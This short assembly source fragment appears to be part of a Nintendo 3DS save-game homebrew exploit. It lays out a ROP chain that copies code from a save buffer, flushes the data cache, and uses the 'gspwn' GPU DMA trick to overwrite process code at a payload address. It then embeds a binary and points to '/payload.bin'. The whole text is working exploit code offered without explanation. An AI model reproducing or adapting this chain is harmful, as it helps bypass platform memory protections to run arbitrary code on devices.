rop:
	memcpy LINEAR_BUFFER, IRON_SAVE0_BUFFER_PTR + initial_code, initial_code_end - initial_code
	flush_dcache LINEAR_BUFFER, 0x2000
	gspwn (IRON_CODE_LINEAR_BASE + (PAYLOAD_VA - 0x00100000)), LINEAR_BUFFER, 0x2000

	sleep 100*1000*1000, 0

	.word PAYLOAD_VA

	.word 0xDEAF0000

.align 0x4
	initial_code:
		.incbin "../build/iron_code.bin"
	initial_code_end:

	file_path:
		.ascii "/payload.bin"
		.byte 0x00
		file_path_end:
